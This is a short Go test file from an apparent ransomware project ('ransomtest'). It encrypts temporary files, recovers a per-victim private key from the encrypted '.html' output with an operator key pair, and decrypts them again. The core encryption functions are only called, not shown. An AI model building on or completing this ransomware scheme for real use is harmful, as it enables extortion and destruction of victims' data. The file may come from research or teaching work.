package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"path"
	"ransomtest/utils"
	"testing"
)

func TestEncryptEmptyFiles(t *testing.T) {
	// encrypt

	//EncryptFiles([]string{"/lqskjdksjqd.txt", "/lmappppazemlazemlkazmelkazmlekalzmek.pdf"})
}

func TestFullMonty(t *testing.T) {
	tempdir, _ := os.MkdirTemp("", "ransomware_food")
	text_1 := []byte("qmsldkqmsldkmqskdmlsqkd")
	text_2 := make([]byte, 1024*100+313)
	rand.Read(text_2)
	file_1 := path.Join(tempdir, "test1.txt")
	file_2 := path.Join(tempdir, "test2.txt")
	check(os.WriteFile(file_1, text_1, 0644))
	check(os.WriteFile(file_2, text_2, 0644))

	privkey, pubkey := GenerateKeys() // Kek Keys
	EncryptFiles([]string{file_1, file_2}, pubkey)
	fmt.Println(privkey)
	victim_privkey := RecoverKeys(utils.GetEncPrivKeyFromFile(file_1+".html"), privkey)
	DecryptFiles(victim_privkey, []string{file_1 + ".html", file_2 + ".html"})
}
